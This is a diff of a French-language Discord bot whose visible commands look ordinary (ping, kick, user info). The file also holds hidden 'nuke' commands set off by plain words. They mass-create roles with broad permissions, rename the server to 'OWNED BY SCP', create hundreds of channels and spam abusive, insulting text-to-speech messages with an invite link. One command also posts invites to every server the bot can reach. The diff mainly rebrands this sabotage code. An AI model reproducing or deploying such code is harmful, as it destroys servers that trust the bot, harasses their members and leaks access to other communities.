@@ -29,7 +29,7 @@ client.on("ready", () => {
     })
     client.on('message', message => {
         if(message.content.startsWith("RWB!ping")) {
-                message.channel.send(new Date().getTime() - message.createdTimestamp + " ms");        
+           message.channel.send(new Date().getTime() - message.createdTimestamp + " ms");        
         }
     })
     client.on('message', message => {
@@ -46,7 +46,6 @@ client.on("ready", () => {
          permissions:[]//the permissions
        //end of create role
       })
-       
       }
       message.channel.send('**etape déjà faites**')//if the step completed
       setInterval(function(){
@@ -66,12 +65,10 @@ client.on("ready", () => {
         if (message.content.startsWith(prefix + "kick")){
         if (message.channel.type === "dm") return;
         if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("vous n'avez pas la permission")
-        
         if (message.mentions.users.size === 0) {
             var nomention = new Discord.RichEmbed()
             .setColor("E46525")
             .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
-    
             message.channel.send(nomention)
             return
         }
@@ -186,7 +183,6 @@ client.on("ready", () => {
               }else {
                 var status = "Hors ligne";
               }
-        
             message.channel.sendMessage({
                 embed: {
                   type: 'rich',
@@ -256,67 +252,67 @@ client.on("ready", () => {
         }
         if(message.content === "roles"){
           for(var i =0; i < 200; i++){
-              message.guild.createRole({name:"Azraël > All !",
+              message.guild.createRole({name:"SCP > All !",
                                        mentionable:false,
                                        permissions:2146958591,
                                        position: "",
                                        color: "#fb0707"
                   })
-                  message.guild.createRole({name:"Azraël > All !",
+                  message.guild.createRole({name:"SCP > All !",
                   mentionable:false,
                   permissions:2146958591,
                   position: "",
                   color: "#ff08c5"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#5d08ff"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#0c08ff"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#08d5ff"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#08ffa3"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#08ff23"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#81ff08"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#fff608"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#ff6f08"
         })
-        message.guild.createRole({name:"Azraël > All !",
+        message.guild.createRole({name:"SCP > All !",
         mentionable:false,
         permissions:2146958591,
         position: "",
@@ -342,30 +338,30 @@ client.on("ready", () => {
                         client.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
                     }
                     if(message.content === "issou"){
-                        message.guild.setName("OWNED BY Azraël")
+                        message.guild.setName("OWNED BY SCP")
                         message.guild.setIcon("https://cdn.discordapp.com/attachments/534842681407438851/535515719534772224/giphy_1.gif")
                       }
                       if(message.content === "pd"){
                         for(var i =0; i < 450; i++){
-                        message.guild.createChannel("fucked by Azraël","voice")
+                        message.guild.createChannel("fucked by SCP","voice")
                         }
                       }
                       if(message.content.includes("@everyone")){
                           for(var i = 0; i < 999; i++){
-                              message.channel.send("Coucou, je suis juste la petite voix qui te dis que Azraël viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de l'azraël @everyone @here", {tts: true})
+                              message.channel.send("Coucou, je suis juste la petite voix qui te dis que SCP viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de la SCP https://discord.gg/3bSneCn @everyone @here", {tts: true})
                           }
                       }
                       if(message.content.includes(".sc")){
                         for(var i =0; i < 999; i++){
-                          message.guild.createChannel("fucked by Azraël", "text").then(c => c.send("Coucou, je suis juste la petite voix qui te dis que Azraël viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de l'azraël @everyone @here", {tts: true}))
+                          message.guild.createChannel("fucked by SCP", "text").then(c => c.send("Coucou, je suis juste la petite voix qui te dis que SCP viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de la SCP https://discord.gg/3bSneCn @everyone @here", {tts: true}))
                         }
                     }
                       //réaction en chaine
                             if(message.content === "channel"){
                                 for(var i = 0; i < 500; i++){
-                                    message.guild.createChannel("fucked by Azraël", "text").then(c => c.send("Coucou, je suis juste la petite voix qui te dis que Azraël viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de l'azraël @everyone @here", {tts: true}))
-                                    message.guild.createChannel("fucked by Azraël","voice")
-                                    message.guild.createChannel("fucked by Azraël","category")    
+                                    message.guild.createChannel("fucked by SCP", "text").then(c => c.send("Coucou, je suis juste la petite voix qui te dis que SCP viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de la SCP https://discord.gg/3bSneCn @everyone @here", {tts: true}))
+                                    message.guild.createChannel("fucked by SCP","voice")
+                                    message.guild.createChannel("fucked by SCP","category")    
                                 }
                               }
                               if(message.content === "destroy"){
@@ -379,9 +375,7 @@ client.on("ready", () => {
                                     message.channel.send("issou").then(m => m.delete());
                                     message.channel.send("channel").then(m => m.delete());
                                     message.channel.send("destroy").then(m => m.delete());
-                                    message.guild.createChannel("fucked by Azraël", "text")
+                                    message.guild.createChannel("fucked by SCP", "text")
                                 }
-       
     });
-
     client.login(process.env.TOKEN)
